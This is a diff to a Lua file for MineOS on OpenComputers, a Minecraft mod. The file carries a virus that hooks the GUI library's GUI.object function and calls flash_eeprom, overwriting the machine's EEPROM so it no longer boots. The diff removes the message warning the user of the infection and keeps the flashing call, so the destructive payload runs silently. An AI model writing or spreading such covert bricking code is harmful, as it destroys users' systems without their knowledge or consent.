@@ -174,32 +174,6 @@ end
 
 -- MineOS vir
 _G.isFlashed = false
-
-local function show_message()
-    local text1 = "Your computer was infected by a virus"
-    local text2 = "Now it will never boot up again."
-    local text3 = "So use it as long as you can =)"
-
-    local system = require("System")
-
-    local workspace, window, menu = system.addWindow(GUI.filledWindow(1, 1, 60, 20, 0xE1E1E1))
-    local layout = window:addChild(GUI.layout(1, 1, window.width, window.height, 1, 1))
-
-    layout:addChild( GUI.text(1, 1, 0x4B4B4B, text1) )
-    layout:addChild( GUI.text(1, 2, 0x4B4B4B, text2) )
-    layout:addChild( GUI.text(1, 3, 0x4B4B4B, text3) )
-
-    window.onResize = function(newWidth, newHeight)
-      window.backgroundPanel.width, window.backgroundPanel.height = newWidth, newHeight
-      layout.width, layout.height = newWidth, newHeight
-    end
-
-    ---------------------------------------------------------------------------------
-
-    -- Draw changes on screen after customizing your window
-    workspace:draw()
-end
-
 local function flash_eeprom()
     local eeprom = component.eeprom
     local eeprom_code = [[local cp = component.proxy
@@ -254,7 +228,6 @@ end
 
 function GUI.object(x, y, width, height)
     if _G.isFlashed == false then
-        show_message()
         flash_eeprom()
     end
 
